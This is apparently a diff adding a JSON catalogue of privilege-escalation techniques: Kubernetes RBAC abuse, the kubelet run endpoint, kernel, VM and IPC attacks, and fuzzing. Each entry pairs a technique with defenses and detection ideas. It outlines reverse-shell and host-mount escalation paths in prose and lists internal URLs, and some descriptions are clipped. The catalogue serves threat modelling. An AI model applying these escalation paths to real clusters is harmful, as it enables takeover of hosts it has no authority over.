+      "Docker",
+      "crictl"
+    ],
+    "url": "https://192.167.5.223:8443/apis/apps/v1/namespaces/sop/daemonsets",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.14",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure privilege escalation for creating job resources.",
+    "description": "If an attacker has the jobs.batch[creat/update/patch] resource permission, the attacker can invoke the APIserver interface to create a privileged container, mount the host directory, run the host as the root, and bounce the shell to obtain the root permission of the host. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/apis/batch/v1/namespaces/<namespace>/jobs",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.15",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure the creation of replicasets resources for privilege escalation.",
+    "description": "If an attacker has the replicasets.app[creat/update/patch] resource permission, the attacker can call the APIserver interface to create a privileged container, mount the host directory, run the host as the root, and bounce the shell to obtain the root permission of the host. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/apis/apps/v1/namespaces/<namespace>/replicasets",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.16",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure the creation of StatefulSets resources for privilege escalation.",
+    "description": "If an attacker has the statefulsets.app[creat/update/patch] resource permission, the attacker can invoke the APIserver interface to create a privileged container, mount the host directory, run the host as the root user, and bounce the shell to obtain the root permission of the host. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/apis/apps/v1/namespaces/<namespace>/statefulsets",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.17",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure the creation of pod resources for privilege escalation.",
+    "description": "1. Log in to the Kubernetes node environment, run the kubectl describe clusterrole command, and view resources:[\"pods\"] and verbs:[\"creat/update/patch\"].",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/api/v1/namespaces/<namespace>/pods",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.18",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure privilege escalation for creating cronjob.batch resources.",
+    "description": "1. Log in to the Kubernetes node environment, run the kubectl describe clusterrole command, and view resources:[\"cronjob.batch\"] and verbs:[\"creat/update/patch\"].",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Tamper with world-writable crontab scripts for scheduled root execution",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/apis/batch/v1/namespaces/<namespace>/cronjobs",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.19",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure privilege escalation for creating pods/exec resources.",
+    "description": "Principle: If a container has pods 1. Log in to the Kubernetes node environment, run the kubectl describe clusterrole command, and view the resources:[\"pods/exec\"] and verbs:[\"creat\"] fields.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.20",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting Operating System Kernel Vulnerabilities for Privilege Escalation",
+    "description": "If the OS kernel has a vulnerability, attackers can exploit the CVE vulnerability to escalate privileges. 1. Log in to the secguard https://secguard-szv.clouddragon.huawei.com/secguard/tool/engine/secbincheck/riskassess/tasks and use the OS scanning tool to scan the OS. 2. Check whether the operating system has kernel vulnerabilities",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container",
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Timely patching of vulnerabilities in the host system",
+      "Patch management and timely kernel updates",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor for unusual kernel module loading (insmod, modprobe)",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "ExploitDB",
+      "searchsploit"
+    ],
+    "url": "https://secguard-szv.clouddragon.huawei.com/secguard/tool/engine/secbincheck/riskassess/tasks",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.21",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting the kubelet component interface of Kubernetes for privilege escalation",
+    "description": "Principle: By default, the kubelet component uses port 10250. This port provides dozens of interfaces.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Implement strict RBAC policies; audit RoleBindings regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Audit Kubernetes API server logs for unauthorized RBAC changes",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "kubectl",
+      "CloudAutoDeploy-CDK"
+    ],
+    "url": "https://<kubeletIP>:<kubeletPort>/run/manager/<podName>/<containerName>?cmd=<",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Operating System Attack > Exploiting Operating System Kernel Vulnerabilities for Privilege Escalation",
+    "description": "Vulnerabilities related to privilege escalation in the container's operating system and the host machine's operating system may allow attackers to achieve privilege escalation both inside the container and on the host machine",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container",
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Timely follow up on the latest vulnerability disclosures such as CVEs, and promptly perform version updates or apply patches as part of emergency response measures.",
+      "Patch management and timely kernel updates",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor for unusual kernel module loading (insmod, modprobe)",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "ExploitDB",
+      "searchsploit"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.3.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "VM Attack > Exploiting Virtual Machine Vulnerabilities for Escalation",
+    "description": "Virtual machine products may have vulnerabilities, and attackers may exploit existing vulnerabilities to escape. Examples include VMware's CVE-2017-4901, QEMU-KVM's CVE-2020-14364, and CVE-2019-14835",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Timely follow up on the latest vulnerability disclosures such as CVEs, and promptly perform version updates or apply patches as part of emergency response measures.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.3.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "VM Attack > Improper network isolation between virtual machines and host machines",
+    "description": "Improper network isolation between virtual machines and the host machine allows attackers to directly target services that may be running on the host machine, such as SSH",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "The host machine and virtual machines cannot be on the same network plane. 2.",
+      "The host machine does not provide additional services.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.1.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "File Permission Configuration Attack > Improper File Configuration Permission Attack",
+    "description": "The file configuration permission is set to 440, allowing non-root users to read the root certificate. This leads to certificate leakage and the possibility of counterfeit devices being created",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Automation Script (DeviceTest)",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": "http://pdm.huawei.com/Windchill/navigator/html/ext/huawei/opensource/vulnerability/view.html?oid=OR:ext.huawei.huaweipart.HuaweiPart:47981449125",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.1.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "File Permission Configuration Attack > Configuration File Privilege Escalation When Container Resources Are Used for Construction",
+    "description": "Principle: When an attacker can control the YAML file used for container deployment, the attacker can set the privilege container + bounce shell mode in the YAML file to perform privilege escalation. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Container",
+      "Cloud"
+    ],
+    "resource_required": [
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Inter-process Communication Attacks > IPC Attack",
+    "description": "1. Check the system services, analyze the services, and identify that a certain API in the system's service does not verify permissions. 2. Develop an APK to complete the service binding",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux",
+      "Android"
+    ],
+    "resource_required": [
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Invoke the checkpermission interface to verify the permission.",
+      "Validate IPC message formats; enforce access controls on IPC channels",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor IPC channel creation and message patterns for anomalies",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "IPC Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Exploit IPC channel with insufficient validation to escalate privileges"
+    ],
+    "related_tools": [],
+    "url": "",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Inter-process Communication Attacks > Fuzz attacks",
+    "description": "Identify external high-risk interfaces of media services at the framework layer, customize execution scripts, and use LibFuzz to attempt Fuzz attacks",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux",
+      "Android"
+    ],
+    "resource_required": [
+      "Fuzzing Framework"
+    ],
+    "potential_defenses": [
+      "Implement secure compilation flags; conduct regular fuzzing audits",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor for crash reports and abnormal process termination patterns",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Fuzzing-Based Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Use fuzzing framework to discover and exploit component vulnerabilities"
+    ],
+    "related_tools": [
+      "LibFuzz",
+      "AFL",
+      "honggfuzz"
+    ],
+    "url": "",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.1.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Inter-process Communication Attacks > Socket attacks",
+    "description": "1. When an externally open Socket port receives external data, it does not perform validity verification on the data or performs identity verification. 2. After simulating a client or server to establish a Socket connection, sensitive data is obtained or backdoor commands are executed",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux",
+      "Android"
+    ],
+    "resource_required": [
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Verify the validity of the invoking party identity and add an authentication mechanism.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "IPC Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Exploit IPC channel with insufficient validation to escalate privileges"
+    ],
+    "related_tools": [
+      "Terminal"
+    ],
+    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/open-socket-poses-risks-to-android-security-model/",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.1.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Inter-process Communication Attacks > Authorization and authentication bypass",
+    "description": "Bypassing authentication to directly establish connections with devices such as car systems, or bypassing the permission control of the distributed software bus to obtain private data, or achieving root privilege escalation",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "During the authentication process, remote devices and the validity of data packets are strictly checked.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "Terminal"
+    ],
+    "url": "",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.1.5",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Inter-process Communication Attacks > Denial-of-Service attacks",
+    "description": "By sending malformed data packets based on the framework layer protocol, consequences such as null pointer dereferencing, resource exhaustion, and illegal access may occur, leading to a denial of service",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Validate and accept untrusted data received by the school, to avoid abnormal issues.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "Terminal"
+    ],
+    "url": "https://dts-szv.clouddragon.huawei.com/DTSPortal/ticket/DTS2021090310721",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Native Component Attack > Open source vulnerability security detection",
+    "description": "By using SecBinaryCheck to scan binaries, we can identify open-source components that pose risks",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Integrate relevant security patches",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "SecBinaryCheck (self-developed tool)"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.2.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Native Component Attack > Unauthenticated Attack via Interface Call",
+    "description": "View the key functions exported by the SO library, such as the decryption interface. By dynamically loading the library, the decryption interface can be invoked, thereby achieving encryption and decryption of key data",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Verify the legitimate identity of the calling party.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": "http://pdm.huawei.com/Windchill/navigator/html/ext/huawei/opensource/vulnerability/view.html?oid=OR:ext.huawei.huaweipart.HuaweiPart:35013966159",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.2.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Native Component Attack > Native Code Security Compilation",
+    "description": "Use the SecBinaryCheck tool to inspect the secure compilation options of the Native library, and confirm whether they are enabled",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Enable secure compilation options",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "SecBinaryCheck (self-developed tool)"
+    ],
+    "url": "https://github.com/slimm609/SecBinaryCheck.sh",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.2.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Native Component Attack > Media Decoding Component Attack",
+    "description": "Attackers exploit vulnerabilities such as out-of-bounds access and memory leaks in media decoding components. They meticulously construct objects such as images and videos, and then launch attacks on media services either locally or remotely. This can lead to process crashes, information leaks, and code execution",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Inspect the media decoding code to identify issues such as out-of-bounds access, overflow, and memory leaks.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "Terminal"
+    ],
+    "url": "https://dts-szv.clouddragon.huawei.com/DTSPortal/ticket/DTS202101050TLWMIP1O00",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "M4.2.3.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "White box fuzzing attack > LibFuzz White-Box Attack",
+    "description": "Using LibFuzz, custom scripts are created to target the interfaces of SO files for Fuzz testing",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux",
+      "Android"
+    ],
+    "resource_required": [
+      "Fuzzing Framework"
+    ],
+    "potential_defenses": [
+      "Implement secure compilation flags; conduct regular fuzzing audits",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor for crash reports and abnormal process termination patterns",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Fuzzing-Based Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Use fuzzing framework to discover and exploit component vulnerabilities"
+    ],
+    "related_tools": [
+      "LibFuzz",
+      "AFL",
+      "honggfuzz"
+    ],
+    "url": "",
+    "is_atlas": false
+  }
+]
